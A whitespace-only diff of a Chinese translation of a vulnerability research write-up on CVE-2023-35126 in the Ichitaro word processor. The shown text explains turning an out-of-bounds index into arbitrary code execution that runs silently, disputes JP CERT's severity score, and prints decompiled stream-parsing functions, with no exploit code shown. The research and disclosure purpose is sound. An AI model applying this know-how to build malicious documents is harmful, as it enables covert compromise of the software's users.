@@ -12,11 +12,11 @@ source: "gelusus/wxvl 公众号漏洞文库"
   
 1. 为了建立优先级，仅使用 CVE-2023-35126 提供的有限原语开发了完整的任意代码执行漏洞，与 JP CERT 的评估相比，证明了其严重性。  
   
-1. 这样做需要深入了解复杂的文件格式以及 Ichitaro 实现的内部机制，反映潜在恶意对手为实现相同目标所需执行的利用研究。   
+1. 这样做需要深入了解复杂的文件格式以及 Ichitaro 实现的内部机制，反映潜在恶意对手为实现相同目标所需执行的利用研究。   
   
 1. 该漏洞将越界索引转换为帧指针覆盖。静默执行有效负载后，进程将被修复，从而允许应用程序完成加载文档的其余部分。进程的无声继续执行至关重要，以免引起目标受害者的警觉。  
   
-1. 其有效负载与漏洞明显分离，并且可以从构建时指定的任意文档流中进行解码。开发和演示的工具和技术将帮助我们更好地评估和更快地了解未来的类似威胁。   
+1. 其有效负载与漏洞明显分离，并且可以从构建时指定的任意文档流中进行解码。开发和演示的工具和技术将帮助我们更好地评估和更快地了解未来的类似威胁。   
   
 1. 我们不再发布完整的漏洞利用代码，但我们认为展示开发异常漏洞利用程序的复杂性并强调漏洞利用缓解措施的重要性非常重要。  
   
@@ -29,16 +29,16 @@ JustSystems, Inc. 的 Ichitaro 字处理组件软件是该公司更大的办公�
 发现的漏洞通常很复杂，难以触及和触发。目前，我们将重点关注一个漏洞，特别是TALOS-2023-1825 (CVE-2023-35126)。出于演示目的，我们使用 Ichitaro 2023 版本 1.0.1.59372。 JustSystems在安全更新中修补了此漏洞2023.10.19。我们的重点是执行根本原因和可利用性分析时所采用的方法。  
   
   
-除了简单的概念证明之外，开发内存损坏漏洞有时非常耗时，因此不能掉以轻心。随着更先进的漏洞利用缓解措施的出现，评估单个漏洞是否可利用及其严重性变得困难。有用的是利用等价类。在特定上下文中对释放后使用漏洞的利用表明，所有类似的释放后使用漏洞都是可利用的。虽然漏洞利用等价类是为最常见的目标类型（例如浏览器或操作系统内核）建立的，但在处理以前未知的软件类型时，我们没有先例可以依靠。   
+除了简单的概念证明之外，开发内存损坏漏洞有时非常耗时，因此不能掉以轻心。随着更先进的漏洞利用缓解措施的出现，评估单个漏洞是否可利用及其严重性变得困难。有用的是利用等价类。在特定上下文中对释放后使用漏洞的利用表明，所有类似的释放后使用漏洞都是可利用的。虽然漏洞利用等价类是为最常见的目标类型（例如浏览器或操作系统内核）建立的，但在处理以前未知的软件类型时，我们没有先例可以依靠。   
   
   
-这在判断漏洞的严重性时尤其重要。我们使用CVSS 3.1 评分对该漏洞的评估为 7.8 (CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)，而JP CERT 为其分配了 3.3 (CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L)，因为他们认为这不是任意的可以执行代码。这严重低估了严重性，并给可能忽略安全更新的用户带来不必要的风险。通过演示和确定此漏洞的可利用性，我们的目标是纠正这种情况并澄清我们未来发现的漏洞的可利用性估计。   
+这在判断漏洞的严重性时尤其重要。我们使用CVSS 3.1 评分对该漏洞的评估为 7.8 (CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)，而JP CERT 为其分配了 3.3 (CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L)，因为他们认为这不是任意的可以执行代码。这严重低估了严重性，并给可能忽略安全更新的用户带来不必要的风险。通过演示和确定此漏洞的可利用性，我们的目标是纠正这种情况并澄清我们未来发现的漏洞的可利用性估计。   
   
   
 当利用公共目标中的漏洞时，可以采用众所周知的技术，例如在利用JavaScript引擎时依赖众所周知的“addrof/fakeobj”抽象。然而，并非所有目标都允许使用相同的通用技术。在某些情况下，交互性是不可能的，或者漏洞的位置不允许对手影响足够的目标以允许利用。  
   
   
-我们剖析了 Ichitaro 中发现的一个漏洞，该漏洞的严重程度似乎有限。利用此漏洞及其所属代码的副作用，我们可以构建更强大的利用原语，最终导致完全任意代码执行。这不仅增强了我们对评估这些漏洞系列的信心，而且记录并演示了进行这项研究所需的构建块、工具和方法。   
+我们剖析了 Ichitaro 中发现的一个漏洞，该漏洞的严重程度似乎有限。利用此漏洞及其所属代码的副作用，我们可以构建更强大的利用原语，最终导致完全任意代码执行。这不仅增强了我们对评估这些漏洞系列的信心，而且记录并演示了进行这项研究所需的构建块、工具和方法。   
   
   
 **格式**  
@@ -82,65 +82,65 @@ then的函数
   
 ```
 int __thiscall object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be(
-        object_9c2044 *this,
-        JSVDA::object_OFRM *ap_oframe_0,
-        int av_documentType_4,
-        int av_flags_8,
-        int av_whichStream_c,
-        _DWORD *ap_result_10)
+        object_9c2044 *this,
+        JSVDA::object_OFRM *ap_oframe_0,
+        int av_documentType_4,
+        int av_flags_8,
+        int av_whichStream_c,
+        _DWORD *ap_result_10)
 {
-  lp_this_64 = this;
-  p_result_10.ap_unkobject_10 = (int)ap_result_10;
-  lp_oframe_6c = ap_oframe_0;
-  constructor_3a9de4(&lv_struc_38);
-  lv_result_4 = 0;
-  sub_3BE29547(lv_feh_60, 0xFFFF, 0);
+  lp_this_64 = this;
+  p_result_10.ap_unkobject_10 = (int)ap_result_10;
+  lp_oframe_6c = ap_oframe_0;
+  constructor_3a9de4(&lv_struc_38);
+  lv_result_4 = 0;
+  sub_3BE29547(lv_feh_60, 0xFFFF, 0);
 ...
-  lv_struc_38.v_documentType_8 = av_documentType_4;
-  lv_struc_38.v_initialParsingFlags_c = av_flags_8;
-  lv_struc_38.p_owner_24 = lp_this_64;
-  lv_struc_38.v_initialField(1)_10 = 1;
-  lv_position_7c = 4;
-  if ( av_whichStream_c == 1 || av_whichStream_c == 3 || av_whichStream_c == 4 )                // Determine which stream name to use
-  {
-    v9 = "DocumentViewStyles";
-  }
-  else
-  {
+  lv_struc_38.v_documentType_8 = av_documentType_4;
+  lv_struc_38.v_initialParsingFlags_c = av_flags_8;
+  lv_struc_38.p_owner_24 = lp_this_64;
+  lv_struc_38.v_initialField(1)_10 = 1;
+  lv_position_7c = 4;
+  if ( av_whichStream_c == 1 || av_whichStream_c == 3 || av_whichStream_c == 4 )                // Determine which stream name to use
+  {
+    v9 = "DocumentViewStyles";
+  }
+  else
+  {
 ...
-    v9 = "DocumentEditStyles";
-  }
-  v10 = object_OFRM::openStreamByName?_132de4(lp_oframe_6c, v9, 16, &lp_oseg_68);               // Open up a stream by a name.
-  if ( v10 != 0x80030002 )
-  {
+    v9 = "DocumentEditStyles";
+  }
+  v10 = object_OFRM::openStreamByName?_132de4(lp_oframe_6c, v9, 16, &lp_oseg_68);               // Open up a stream by a name.
+  if ( v10 != 0x80030002 )
+  {
 ...
-    *(_QWORD *)&lp_oframe_70 = 0i64;
-    if ( object_OSEG::setCurrentStreamPosition_1329ce(lp_oseg_68, 0, 0, 0, 0) >= 0              // Read a two 16-bit integers for the header
-      && object_OSEG::read_ushort_3a7664(lp_oseg_68, &lv_ushort_74)
-      && object_OSEG::read_ushort_3a7664(lp_oseg_68, &lv_ushort_78) )
-    {
-      if ( (unsigned __int16)lv_ushort_74 <= 1u )
-      {
-        lv_struc_38.vw_version_20 = lv_ushort_74;
-        lv_struc_38.vw_used_22 = lv_ushort_78;
+    *(_QWORD *)&lp_oframe_70 = 0i64;
+    if ( object_OSEG::setCurrentStreamPosition_1329ce(lp_oseg_68, 0, 0, 0, 0) >= 0              // Read a two 16-bit integers for the header
+      && object_OSEG::read_ushort_3a7664(lp_oseg_68, &lv_ushort_74)
+      && object_OSEG::read_ushort_3a7664(lp_oseg_68, &lv_ushort_78) )
+    {
+      if ( (unsigned __int16)lv_ushort_74 <= 1u )
+      {
+        lv_struc_38.vw_version_20 = lv_ushort_74;
+        lv_struc_38.vw_used_22 = lv_ushort_78;
 ...
-        v12 = 0;
-        for ( i = 4; ; lv_position_7c = i )                                                     // Loop to process contents of stream
-        {
-          v25 = v12;
-          v14 = struc_3a9de4::parseStylesContent_3a7048(&lv_struc_38, lp_oseg_68, i, v12, av_whichStream_c, p_result_10, 0);
-          v_result_8 = v14;
-          if ( v14 == 0xFFFFFFE8 )
-            break;
-          if ( v14 != 1 )
-            goto return(@edi)_3a78dd;
-          i = lv_struc_38.v_header_long_4 + 6 + lv_position_7c;
-          v12 = ((unsigned int)lv_struc_38.v_header_long_4 + 6i64 + __PAIR64__(v25, lv_position_7c)) >> 32;
-        }
-        v_result_8 = 1;
-      }
+        v12 = 0;
+        for ( i = 4; ; lv_position_7c = i )                                                     // Loop to process contents of stream
+        {
+          v25 = v12;
+          v14 = struc_3a9de4::parseStylesContent_3a7048(&lv_struc_38, lp_oseg_68, i, v12, av_whichStream_c, p_result_10, 0);
+          v_result_8 = v14;
+          if ( v14 == 0xFFFFFFE8 )
+            break;
+          if ( v14 != 1 )
+            goto return(@edi)_3a78dd;
+          i = lv_struc_38.v_header_long_4 + 6 + lv_position_7c;
+          v12 = ((unsigned int)lv_struc_38.v_header_long_4 + 6i64 + __PAIR64__(v25, lv_position_7c)) >> 32;
+        }
+        v_result_8 = 1;
+      }
 ...
-  return v_result_7;
+  return v_result_7;
 }
 ```  
   
@@ -150,7 +150,7 @@ int __thiscall object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)
 object_9c2044::parseStream(DocumentViewStyles,DocumentEditStyles)_3a76be。该函数引用  
 DocumentViewStyles流。具体来说，  
 DocumentViewStyles和  
-DocumentEditStyles字符串都是相邻引用的，仅由条件分隔开。因此，两个流可能使用相同的实现来解析它们的内容，并且使用参数来区分它们。在同一函数的底部是一个循环，可能用于处理流的可变长度内容。如果我们检查此循环的每次迭代所调用的函数，我们将遇到以下函数，该函数具有合理的复杂性，并且似乎使用 16 位整数作为键来处理一定数量的记录类型。该函数的形状如以下屏幕截图所示。   
+DocumentEditStyles字符串都是相邻引用的，仅由条件分隔开。因此，两个流可能使用相同的实现来解析它们的内容，并且使用参数来区分它们。在同一函数的底部是一个循环，可能用于处理流的可变长度内容。如果我们检查此循环的每次迭代所调用的函数，我们将遇到以下函数，该函数具有合理的复杂性，并且似乎使用 16 位整数作为键来处理一定数量的记录类型。该函数的形状如以下屏幕截图所示。   
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscfXUDLD32rlPIXhFs2sGJY8xyt8wTKSjYQiaYLmZTOXDD9oc2IKaawrw/640?wx_fmt=png&from=appmsg "")  
   
@@ -160,229 +160,229 @@ DocumentEditStyles字符串都是相邻引用的，仅由条件分隔开。因�
   
 ```
 int __thiscall struc_3a9de4::parseStylesContent_3a7048(
-        struc_3a9de4 *this,
-        JSVDA::object_OSEG *ap_oseg_0,
-        int av_position(lo)_4,
-        int av_position(hi)_8,
-        int av_currentStreamState?_c,
-        frame_3a7048_arg_10 ap_unkobjectunion_10,
-        frame_3a7048_arg_14 ap_nullunion_14)
+        struc_3a9de4 *this,
+        JSVDA::object_OSEG *ap_oseg_0,
+        int av_position(lo)_4,
+        int av_position(hi)_8,
+        int av_currentStreamState?_c,
+        frame_3a7048_arg_10 ap_unkobjectunion_10,
+        frame_3a7048_arg_14 ap_nullunion_14)
 {
-  lv_result_4 = 0;
-  p_oseg_0 = ap_oseg_0;
+  lv_result_4 = 0;
+  p_oseg_0 = ap_oseg_0;
 ...
-  v_documentType_8 = this->v_documentType_8;
-  v_boxHeaderResult_0 = struc_3a9de4::readBoxHeader?_3a6fae(this, ap_oseg_0);
-  if ( v_boxHeaderResult_0 != 31 )
-  {
+  v_documentType_8 = this->v_documentType_8;
+  v_boxHeaderResult_0 = struc_3a9de4::readBoxHeader?_3a6fae(this, ap_oseg_0);
+  if ( v_boxHeaderResult_0 != 31 )
+  {
 ...
-    vw_header_word_0 = (unsigned __int16)this->vw_header_word_0;                        // Check first 16-bit word from stream
-    p_owner_24 = this->p_owner_24;
-    lp_owner_8 = p_owner_24;
-    if ( vw_header_word_0 > 0x2003 )
-    {
-      v_wordsub(2004)_0 = vw_header_word_0 - 0x2004;
-      if ( v_wordsub(2004)_0 )
-      {
-        v_word(2005)_0 = v_wordsub(2004)_0 - 1;
-        if ( !v_word(2005)_0 )
-        {
-          if ( av_currentStreamState?_c != 5 ) {                                        // Check for record type 0x2005
-            struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
-            p_styleObject_3a712c = struc_3a9de4::readStyleType(2005)_3a6bec(this, p_oseg_0, this->v_header_long_4, Av_parsingFlagField_8 == 3);
-            goto returning(@eax)_endrecord_3a736f;
-          }
-          goto returning(1)_endrecord_3a70f9;
-        }
-        v_wordsub(2006)_0 = v_word(2005)_0 - 1;
-        if ( v_wordsub(2006)_0 )
-        {
-          v_word(2007)_0 = v_wordsub(2006)_0 - 1;
-          if ( v_word(2007)_0 )
-          {
-            v_word(2008)_0 = v_word(2007)_0 - 1;
-            if ( !v_word(2008)_0 )
-            {
+    vw_header_word_0 = (unsigned __int16)this->vw_header_word_0;                        // Check first 16-bit word from stream
+    p_owner_24 = this->p_owner_24;
+    lp_owner_8 = p_owner_24;
+    if ( vw_header_word_0 > 0x2003 )
+    {
+      v_wordsub(2004)_0 = vw_header_word_0 - 0x2004;
+      if ( v_wordsub(2004)_0 )
+      {
+        v_word(2005)_0 = v_wordsub(2004)_0 - 1;
+        if ( !v_word(2005)_0 )
+        {
+          if ( av_currentStreamState?_c != 5 ) {                                        // Check for record type 0x2005
+            struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
+            p_styleObject_3a712c = struc_3a9de4::readStyleType(2005)_3a6bec(this, p_oseg_0, this->v_header_long_4, Av_parsingFlagField_8 == 3);
+            goto returning(@eax)_endrecord_3a736f;
+          }
+          goto returning(1)_endrecord_3a70f9;
+        }
+        v_wordsub(2006)_0 = v_word(2005)_0 - 1;
+        if ( v_wordsub(2006)_0 )
+        {
+          v_word(2007)_0 = v_wordsub(2006)_0 - 1;
+          if ( v_word(2007)_0 )
+          {
+            v_word(2008)_0 = v_word(2007)_0 - 1;
+            if ( !v_word(2008)_0 )
+            {
 ...
-              if ( p_object_60 )
-              {
- 
+              if ( p_object_60 )
+              {
+ 
 LABEL_93:
-                p_styleObject_3a712c = object_9d0d30::readStyleType(2008)_391906(       // Process record type 0x2008
-                                         p_object_60,
-                                         p_oseg_0,
-                                         this->v_header_long_4,
-                                         Av_parsingFlagField_8,
-                                         this->v_documentType_8,
-                                         ap_unkobjectunion_10.ap_unkobject_10,
-                                         &lv_result_4);
-                goto returning(@eax)_endrecord_3a736f;
-              }
-              goto returning(@esi)_endrecord_3a7625;
-            }
-            if ( v_word(2008)_0 == 8 )
-            {
+                p_styleObject_3a712c = object_9d0d30::readStyleType(2008)_391906(       // Process record type 0x2008
+                                         p_object_60,
+                                         p_oseg_0,
+                                         this->v_header_long_4,
+                                         Av_parsingFlagField_8,
+                                         this->v_documentType_8,
+                                         ap_unkobjectunion_10.ap_unkobject_10,
+                                         &lv_result_4);
+                goto returning(@eax)_endrecord_3a736f;
+              }
+              goto returning(@esi)_endrecord_3a7625;
+            }
+            if ( v_word(2008)_0 == 8 )
+            {
 ...
-                p_styleObject_3a712c = object_9d0d30::readStyleType(2010)_392cab(       // Process record type 0x2010
-                                         field(64)_6bf3a6,
-                                         p_oseg_0,
-                                         this->v_header_long_4,
-                                         Av_parsingFlagField_8,
-                                         this->v_documentType_8,
-                                         ap_unkobjectunion_10.ap_unkobject_10,
-                                         (int)&lv_result_4);
-                goto returning(@eax)_endrecord_3a736f;
-              }
-              goto returning(@esi)_endrecord_3a7625;
-            }
-            goto check_pushStream_3a73fe;
-          }
+                p_styleObject_3a712c = object_9d0d30::readStyleType(2010)_392cab(       // Process record type 0x2010
+                                         field(64)_6bf3a6,
+                                         p_oseg_0,
+                                         this->v_header_long_4,
+                                         Av_parsingFlagField_8,
+                                         this->v_documentType_8,
+                                         ap_unkobjectunion_10.ap_unkobject_10,
+                                         (int)&lv_result_4);
+                goto returning(@eax)_endrecord_3a736f;
+              }
+              goto returning(@esi)_endrecord_3a7625;
+            }
+            goto check_pushStream_3a73fe;
+          }
 ...
-        }
+        }
 ...
-      }
+      }
 ...
-      return p_result_3a705e;
-    }
-    if ( vw_header_word_0 == 0x2003 )
-    {
-      if ( (Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
-         && (*(_BYTE *)(ap_unkobjectunion_10.ap_unkobject_10 + 0x204) & 0x40) != 0) && av_currentStreamState?_c != 5 )
-      {
-        struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
-        p_field(38)_55 = object_10cbd2::get_field(38)_7b15a6(lp_owner_8->v_data_290.p_object_48, 0);
-        p_styleObject_3a712c = object_9bd120::readStyleType(2003)_1d63a3(               // Process record type 0x2003
-                                 p_field(38)_55,
-                                 p_oseg_0,
-                                 this->v_header_long_4,
-                                 Av_parsingFlagField_8,
-                                 ap_unkobjectunion_10.ap_unkobject_10);
-        goto returning(@eax)_endrecord_3a736f;
-      }
-      goto returning(1)_endrecord_3a70f9;
-    }
-    v_wordsub(1000)_0 = vw_header_word_0 - 0x1000;
-    if ( v_wordsub(1000)_0 )
-    {
-      v_wordsub(1001)_0 = v_wordsub(1000)_0 - 1;
-      if ( !v_wordsub(1001)_0 )                                                         // Process record type 0x1001
-      {
+      return p_result_3a705e;
+    }
+    if ( vw_header_word_0 == 0x2003 )
+    {
+      if ( (Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
+         && (*(_BYTE *)(ap_unkobjectunion_10.ap_unkobject_10 + 0x204) & 0x40) != 0) && av_currentStreamState?_c != 5 )
+      {
+        struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
+        p_field(38)_55 = object_10cbd2::get_field(38)_7b15a6(lp_owner_8->v_data_290.p_object_48, 0);
+        p_styleObject_3a712c = object_9bd120::readStyleType(2003)_1d63a3(               // Process record type 0x2003
+                                 p_field(38)_55,
+                                 p_oseg_0,
+                                 this->v_header_long_4,
+                                 Av_parsingFlagField_8,
+                                 ap_unkobjectunion_10.ap_unkobject_10);
+        goto returning(@eax)_endrecord_3a736f;
+      }
+      goto returning(1)_endrecord_3a70f9;
+    }
+    v_wordsub(1000)_0 = vw_header_word_0 - 0x1000;
+    if ( v_wordsub(1000)_0 )
+    {
+      v_wordsub(1001)_0 = v_wordsub(1000)_0 - 1;
+      if ( !v_wordsub(1001)_0 )                                                         // Process record type 0x1001
+      {
 ...
-        p_styleObject_3a712c = object_9e5ffc::readStyleType(1001)_1b8cd2(p_object_190c, p_oseg_0, this->v_header_long_4, 0);
-        goto returning(@eax)_endrecord_3a736f;
-      }
-      v_word(1001)_15 = v_wordsub(1001)_0 - 1;
-      if ( !v_word(1001)_15 )                                                           // Process record type 0x1002
-      {
-        if ( av_currentStreamState?_c != 3 && av_currentStreamState?_c != 4
-          && (Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
-           && (*(_DWORD *)(ap_unkobjectunion_10.ap_unkobject_10 + 516) & 0x100) != 0) )
-        {
+        p_styleObject_3a712c = object_9e5ffc::readStyleType(1001)_1b8cd2(p_object_190c, p_oseg_0, this->v_header_long_4, 0);
+        goto returning(@eax)_endrecord_3a736f;
+      }
+      v_word(1001)_15 = v_wordsub(1001)_0 - 1;
+      if ( !v_word(1001)_15 )                                                           // Process record type 0x1002
+      {
+        if ( av_currentStreamState?_c != 3 && av_currentStreamState?_c != 4
+          && (Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
+           && (*(_DWORD *)(ap_unkobjectunion_10.ap_unkobject_10 + 516) & 0x100) != 0) )
+        {
 ...
-          struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
-          if ( ap_nullunion_14.object_e7480 )
-          {
-            p_styleObject_3a712c = object_e7480::readStyleType(1002)_77a7bf(
-                                     ap_nullunion_14.object_e7480,
-                                     p_oseg_0,
-                                     this->v_header_long_4,
-                                     v_documentType_8,
-                                     Av_parsingFlagField_8,
-                                     0);
-            goto returning(@eax)_endrecord_3a736f;
-          }
-        }
-        goto returning(1)_endrecord_3a70f9;
-      }
-      v_wordsub(1fff)_15 = v_word(1001)_15 - 0xFFE;
-      if ( v_wordsub(1fff)_15 )
-      {
-        v_word(2000)_15 = v_wordsub(1fff)_15 - 1;
-        if ( !v_word(2000)_15 )                                                         // Process record type 0x2001
-        {
-          if ( av_currentStreamState?_c == 5 )
-          {
-            p_field(34)_18 = object_10cbd2::get_field(34)_7b9e07(p_owner_24->v_data_290.p_object_48, 0);
-            p_styleObject_3a712c = object_9bd0e4::readStyleType(2001)_1d24a9(
-                                     p_field(34)_18,
-                                     p_oseg_0,
-                                     this->v_header_long_4,
-                                     Av_parsingFlagField_8,
-                                     this->v_documentType_8,
-                                     ap_unkobjectunion_10.ap_unkobject_10);
-            goto returning(@eax)_endrecord_3a736f;
-          }
-          if ( Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
-            && (*(_BYTE *)(ap_unkobjectunion_10.ap_unkobject_10 + 516) & 0x10) != 0 )
-          {
-            struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
+          struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
+          if ( ap_nullunion_14.object_e7480 )
+          {
+            p_styleObject_3a712c = object_e7480::readStyleType(1002)_77a7bf(
+                                     ap_nullunion_14.object_e7480,
+                                     p_oseg_0,
+                                     this->v_header_long_4,
+                                     v_documentType_8,
+                                     Av_parsingFlagField_8,
+                                     0);
+            goto returning(@eax)_endrecord_3a736f;
+          }
+        }
+        goto returning(1)_endrecord_3a70f9;
+      }
+      v_wordsub(1fff)_15 = v_word(1001)_15 - 0xFFE;
+      if ( v_wordsub(1fff)_15 )
+      {
+        v_word(2000)_15 = v_wordsub(1fff)_15 - 1;
+        if ( !v_word(2000)_15 )                                                         // Process record type 0x2001
+        {
+          if ( av_currentStreamState?_c == 5 )
+          {
+            p_field(34)_18 = object_10cbd2::get_field(34)_7b9e07(p_owner_24->v_data_290.p_object_48, 0);
+            p_styleObject_3a712c = object_9bd0e4::readStyleType(2001)_1d24a9(
+                                     p_field(34)_18,
+                                     p_oseg_0,
+                                     this->v_header_long_4,
+                                     Av_parsingFlagField_8,
+                                     this->v_documentType_8,
+                                     ap_unkobjectunion_10.ap_unkobject_10);
+            goto returning(@eax)_endrecord_3a736f;
+          }
+          if ( Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
+            && (*(_BYTE *)(ap_unkobjectunion_10.ap_unkobject_10 + 516) & 0x10) != 0 )
+          {
+            struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
 ...
-            p_field(34)_1f->v_data_4.field_5a8 = 1;
-            p_styleObject_3a712c = object_9bd0e4::readStyleType(2001)_1b8f99(
-                                     p_field(34)_1f,
-                                     p_oseg_0,
-                                     this->v_header_long_4,
-                                     Av_parsingFlagField_8,
-                                     this->v_documentType_8,
-                                     lp_unkobject_20,
-                                     &lv_result_4);
-            goto returning(@eax)_endrecord_3a736f;
-          }
+            p_field(34)_1f->v_data_4.field_5a8 = 1;
+            p_styleObject_3a712c = object_9bd0e4::readStyleType(2001)_1b8f99(
+                                     p_field(34)_1f,
+                                     p_oseg_0,
+                                     this->v_header_long_4,
+                                     Av_parsingFlagField_8,
+                                     this->v_documentType_8,
+                                     lp_unkobject_20,
+                                     &lv_result_4);
+            goto returning(@eax)_endrecord_3a736f;
+          }
 returning(1)_endrecord_3a70f9:
-          lv_result_4 = 1;
-          goto returning(@esi)_skipRecord_3a762b;
-        }
-        if ( v_word(2000)_15 == 1 )                                                     // Process record type 0x2002
-        {
-          if ( (Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
-             && (*(_BYTE *)(ap_unkobjectunion_10.ap_unkobject_10 + 516) & 0x20) != 0)
-            && av_currentStreamState?_c != 5 )
-          {
-            struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
-            field(3c)_109b2a = object_10cbd2::get_field(3c)_109b2a(lp_owner_8->v_data_290.p_object_48, 0);
-            p_styleObject_3a712c = object_9bd184::readStyleType(2002)_1cdcf6(
-                                     field(3c)_109b2a,
-                                     p_oseg_0,
-                                     this->v_header_long_4,
-                                     Av_parsingFlagField_8,
-                                     ap_unkobjectunion_10.ap_unkobject_10);
-            p_result_3a705e = p_styleObject_3a712c;
-            goto returning(@esi)_endrecord_3a7625;
-          }
-          goto returning(1)_endrecord_3a70f9;
-        }
+          lv_result_4 = 1;
+          goto returning(@esi)_skipRecord_3a762b;
+        }
+        if ( v_word(2000)_15 == 1 )                                                     // Process record type 0x2002
+        {
+          if ( (Av_parsingFlagField_8 != 3 || ap_unkobjectunion_10.ap_unkobject_10
+             && (*(_BYTE *)(ap_unkobjectunion_10.ap_unkobject_10 + 516) & 0x20) != 0)
+            && av_currentStreamState?_c != 5 )
+          {
+            struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
+            field(3c)_109b2a = object_10cbd2::get_field(3c)_109b2a(lp_owner_8->v_data_290.p_object_48, 0);
+            p_styleObject_3a712c = object_9bd184::readStyleType(2002)_1cdcf6(
+                                     field(3c)_109b2a,
+                                     p_oseg_0,
+                                     this->v_header_long_4,
+                                     Av_parsingFlagField_8,
+                                     ap_unkobjectunion_10.ap_unkobject_10);
+            p_result_3a705e = p_styleObject_3a712c;
+            goto returning(@esi)_endrecord_3a7625;
+          }
+          goto returning(1)_endrecord_3a70f9;
+        }
 ...
-      }
+      }
 ...
-    }
+    }
 ...
-    if ( av_currentStreamState?_c == 3 )                                                // Process record type 0x1000
-    {
-      object_9e5ffc = (object_9e5ffc *)p_object_c->v_data_4.p_object_190c;
-      if ( object_9e5ffc )
-      {
-        p_styleObject_3a712c = object_9e5ffc::readStyleType(1000)_1b6bf7(object_9e5ffc, p_oseg_0, this->v_header_long_4, this);
-        goto returning(@eax)_endrecord_3a736f;
-      }
-    }
-    else
-    {
-      if ( av_currentStreamState?_c == 4 )
-      {
-        p_styleObject_3a712c = object_9c2044::readStyleType(1000)_4d951d(
-                                 p_owner_24,
-                                 p_oseg_0,
-                                 this->v_header_long_4,
-                                 (frame_3a7048_arg_10)ap_unkobjectunion_10.ap_unkobject_10);
-        goto returning(@eax)_endrecord_3a736f;
-      }
+    if ( av_currentStreamState?_c == 3 )                                                // Process record type 0x1000
+    {
+      object_9e5ffc = (object_9e5ffc *)p_object_c->v_data_4.p_object_190c;
+      if ( object_9e5ffc )
+      {
+        p_styleObject_3a712c = object_9e5ffc::readStyleType(1000)_1b6bf7(object_9e5ffc, p_oseg_0, this->v_header_long_4, this);
+        goto returning(@eax)_endrecord_3a736f;
+      }
+    }
+    else
+    {
+      if ( av_currentStreamState?_c == 4 )
+      {
+        p_styleObject_3a712c = object_9c2044::readStyleType(1000)_4d951d(
+                                 p_owner_24,
+                                 p_oseg_0,
+                                 this->v_header_long_4,
+                                 (frame_3a7048_arg_10)ap_unkobjectunion_10.ap_unkobject_10);
+        goto returning(@eax)_endrecord_3a736f;
+      }
 ...
-    }
-    struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
-    object_9e5ffc = ap_nullunion_14.object_9e5ffc;
-    goto readStyleType(1000)_3a7365;
-  }
-  return 0xFFFFFFE8;
+    }
+    struc_3a9de4::ensureFieldObjectsConstructed??_3a6d8b(this, 0);
+    object_9e5ffc = ap_nullunion_14.object_9e5ffc;
+    goto readStyleType(1000)_3a7365;
+  }
+  return 0xFFFFFFE8;
 }
 ```  
   
@@ -397,73 +397,73 @@ returning(1)_endrecord_3a70f9:
   
 ```
 int __thiscall object_9d0d30::readStyleType(2008)_391906(
-        object_9d0d30 *this,
-        JSVDA::object_OSEG *ap_oseg_0,
-        int av_size_4,
-        int av_someFlag_8,
-        int av_documentType_c,
-        int ap_nullobject_10,
-        int *ap_unusedResult_14)
+        object_9d0d30 *this,
+        JSVDA::object_OSEG *ap_oseg_0,
+        int av_size_4,
+        int av_someFlag_8,
+        int av_documentType_c,
+        int ap_nullobject_10,
+        int *ap_unusedResult_14)
 {
 ...
-  v34 = 0;
-  p_object_14 = this->v_data_20.p_object_14;
+  v34 = 0;
+  p_object_14 = this->v_data_20.p_object_14;
 ...
-  v9 = JSFC::malloc_181e(sizeof(object_9d14a0));
+  v9 = JSFC::malloc_181e(sizeof(object_9d14a0));
 ...
-  if ( v9 )
-    v10 = object_9d14a0::constructor_38cb12(v9, this->v_data_20.p_object(9c2044)_c, this);
+  if ( v9 )
+    v10 = object_9d14a0::constructor_38cb12(v9, this->v_data_20.p_object(9c2044)_c, this);
 ...
-  this->v_data_20.p_object_14 = v10;
-  object_9d14a0::addSixObjects_38cb7d(v10);
-  for ( i = 0; i < 6; ++i )                                                                     // Loop for an array with a static length
-    lv_objects(6)_6c[i] = object_9d14a0::getPropertyForItemAtIndex_37a71d(this->v_data_20.p_object_14, i);
+  this->v_data_20.p_object_14 = v10;
+  object_9d14a0::addSixObjects_38cb7d(v10);
+  for ( i = 0; i < 6; ++i )                                                                     // Loop for an array with a static length
+    lv_objects(6)_6c[i] = object_9d14a0::getPropertyForItemAtIndex_37a71d(this->v_data_20.p_object_14, i);
 ...
-  while ( lvw_case_84 != 0xFFFF )                                                               // Keep reading records until 0xFFFF
-  {
-    switch ( lvw_case_84 )
-    {
-      case 0u:                                                                                  // Case 0-4,6,8,9 are similar.
-        if ( !arena_reader::read_header_779756(&lv_triple_80, &lv_size_74, &lvw_index_70) )
-          goto LABEL_47;
-        LOWORD(lv_size_74) = lv_size_74 - 2;
